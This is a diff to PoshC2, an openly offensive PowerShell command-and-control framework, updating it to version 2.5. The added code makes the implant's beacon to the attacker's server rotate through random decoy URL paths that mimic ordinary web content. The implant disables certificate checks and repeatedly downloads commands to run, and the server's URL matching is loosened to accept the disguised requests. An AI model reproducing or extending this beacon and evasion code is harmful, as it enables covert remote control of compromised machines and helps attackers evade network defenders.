@@ -18,7 +18,7 @@ Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -Fore
 Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
 Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
 Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
-Write-Host "=============== v2.4 www.PoshC2.co.uk ==============" -ForegroundColor Green
+Write-Host "=============== v2.5 www.PoshC2.co.uk ==============" -ForegroundColor Green
 Write-Host "====================================================" `n -ForegroundColor Green
 
 if (!$RestartC2Server) {
@@ -1601,6 +1601,7 @@ function Decrypt-String2($key, $encryptedStringWithIV) {
     #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
 }
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+$URI= "'+$randomuri+'"
 $Server = "'+$ipv4address+":"+$serverport+'/'+$randomuri+'"
 $ServerClean = "'+$ipv4address+":"+$serverport+'"
 while($true)
@@ -1613,6 +1614,9 @@ while($true)
     $newsleep = $sleeptimeran|get-random
     if ($newsleep -lt 1) {$newsleep = 5} 
     start-sleep $newsleep
+    $URLS = "images/static/content/","news/?id=","webapp/static/","images/prints/","wordpress/site/","steam?p=","true/images/77/static?","holidngs/images/"
+    $RandomURI = Get-Random $URLS
+    $Server = "$ServerClean/$RandomURI$URI"
     $ReadCommand = (Get-Webclient).DownloadString("$Server")
 
     while($ReadCommand) {
@@ -1683,7 +1687,7 @@ $message =[Convert]::ToBase64String($Bytes)
         # if more than one command, each command is split by some delimeter
 
         # send the actual command to the client 
-        if (($request.Url -match "/$ranuri") -and ($request.HttpMethod -eq 'GET') -and ($taskid))
+        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($taskid))
         {   
             if (!$taskid.ToLower().startswith('fvdsghfdsyyh')) {
                 Write-Host "Command issued against host: $hostname" -ForegroundColor Yellow
@@ -1719,7 +1723,7 @@ $message =[Convert]::ToBase64String($Bytes)
             Invoke-SqliteQuery -DataSource $Database -Query "DELETE FROM NewTasks WHERE RandomURI='$ranuri' and TaskID='$taskidtime'"|out-null
         } 
         # send the default command/response if there is no command
-        if (($request.Url -match "/$ranuri") -and ($request.HttpMethod -eq 'GET') -and (!$taskid)) 
+        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and (!$taskid)) 
         { 
             Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
             $message = 'fvdsghfdsyyh'
@@ -1729,7 +1733,7 @@ $message =[Convert]::ToBase64String($Bytes)
         } 
 
         # a completed command has returned to the c2 server
-        if (($request.Url -match "/$ranuri") -and ($request.HttpMethod -eq 'POST')) 
+        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'POST')) 
         { 
             $responseStream = $request.InputStream 
             $targetStream = New-Object -TypeName System.IO.MemoryStream 
